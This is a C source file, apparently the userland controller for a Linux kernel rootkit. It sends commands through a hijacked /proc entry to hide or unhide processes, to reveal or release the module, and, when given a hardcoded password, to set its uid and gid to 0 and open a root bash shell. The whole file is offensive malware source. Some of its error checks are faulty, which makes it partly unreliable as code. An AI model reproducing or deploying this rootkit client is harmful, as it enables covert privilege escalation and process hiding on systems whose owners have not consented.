/*test_rootkit.c*/
 #include<stdio.h>
 #include<unistd.h>
 #include<fcntl.h>
 #include<string.h>
 #include<errno.h>
 #include<sys/stat.h>

/*rootkit_conf.h*/
 static char password[] = "secretpassword" ; //give here password
 static char passwaiter[] = "version" ; //here is name of entry to infect in /proc - you pass commands to it
 static char module_release[] = "release" ; //command to release the module(make possible to unload it)
 static char module_uncover[] = "uncover" ; //command to show the module
 static char hide_proc[] = "hide" ; //command to hide specified process
 static char unhide_proc[] = "unhide"; //command to "unhide" last hidden process

 static char file[64];
 static char command[64];
 int root = 0;
 int main(int argc, char *argv[])
 {
     if(argc < 2)
     {
         fprintf(stderr, "Usage: %s <command>\n", argv[0]);
         return 1;
     }
     int fd ;
     /* We get path to infected entry */
     sprintf(file, "/proc/%s", passwaiter);

     /* If sent command is equal to command which has to give us root, we must run shell at the end */
     if(!strcmp(argv[1], password))
         root = 1;

     /* At first we try to write command to that entry */
     fd = open(file, O_WRONLY);
     if(fd < 1)
     {
         printf("Opening for writing failed! Trying to open for reading!\n");
         /* Otherwise, we send command by reading */
         fd = open(file, O_RDONLY);
         if(!fd) {
             perror("open");
         return 1;
         }
         read(fd, argv[1], strlen(argv[1]));
     }
     else
       write(fd, argv[1], strlen(argv[1]));
 end:
     close(fd) ;
     printf("[+] I did it!\n") ;
     /* if we have to get root, we run shell */
     if(root) {
         uid_t uid = getuid() ;
         printf("[+] Success! uid=%i\n", uid) ;
         setuid(0) ;
         setgid(0) ;
         execl("/bin/bash", "bash", 0) ;
     }
     return 0;
 }
